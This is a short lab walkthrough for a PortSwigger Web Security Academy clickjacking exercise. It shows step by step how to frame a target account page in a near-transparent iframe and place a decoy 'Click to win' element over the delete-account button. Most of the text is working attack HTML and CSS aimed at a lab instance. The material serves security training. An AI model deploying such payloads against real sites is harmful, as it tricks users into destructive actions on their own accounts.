# Lab: Basic clickjacking with CSRF token protection
# https://portswigger.net/web-security/learning-paths/clickjacking/clickjacking-how-to-construct-a-basic-clickjacking-attack/clickjacking/lab-basic-csrf-protected#

```bash
# Open my account page and take url.

https://0a6900d404afc9fb85575dcf00800066.web-security-academy.net/my-account

# Go to exploit server
```

```bash
<iframe src="https://0a6900d404afc9fb85575dcf00800066.web-security-academy.net/my-account">
</iframe>

# View exploit and you will see my account page iframe

```
```bash
<style>
	iframe{
		position:relative;
		width: 1400px;
		height: 780px;
		opacity: 0.001;
		z-index: 2;
	}
</style>
<iframe src="https://0a6900d404afc9fb85575dcf00800066.web-security-academy.net/my-account"></iframe>

# We styled it.
```

```bash
# Let's add div
<style>
	iframe{
		position:relative;
		width: 1000px;
		height: 1000px;
		opacity: 0.501;
		z-index: 2;
		
		
	}
	
	div{
		position:absolute;
		top: 100px;
		left: 100px;
		z-index: 1;
        }
</style>
<div>Click to win 10000$</div>
<iframe src="https://0a6900d404afc9fb85575dcf00800066.web-security-academy.net/my-account"></iframe>

```

```bash
# Position div on to delete account button and turn my account page to transparent.

<style>
	iframe{
		position:relative;
		width: 1000px;
		height: 1000px;
		opacity: 0.001;
		z-index: 2;
		
		
	}
	
	div{
		position:absolute;
		top: 520px;
		left: 28px;
		z-index: 1;
        }
</style>
<div>Click to win 100$</div>
<iframe src="https://0a6900d404afc9fb85575dcf00800066.web-security-academy.net/my-account"></iframe>

# If this doesn't work try this one:

<style>
	iframe{
		position:relative;
		width: 1000px;
		height: 700px;
		opacity: 0.0001;
		z-index: 2;
		
		
	}
	
	div{
		position:absolute;
		top: 515px;
		left: 60px;
		z-index: 1;
        }
</style>
<div>Click me</div>
<iframe src="https://0a6900d404afc9fb85575dcf00800066.web-security-academy.net/my-account"></iframe>

```
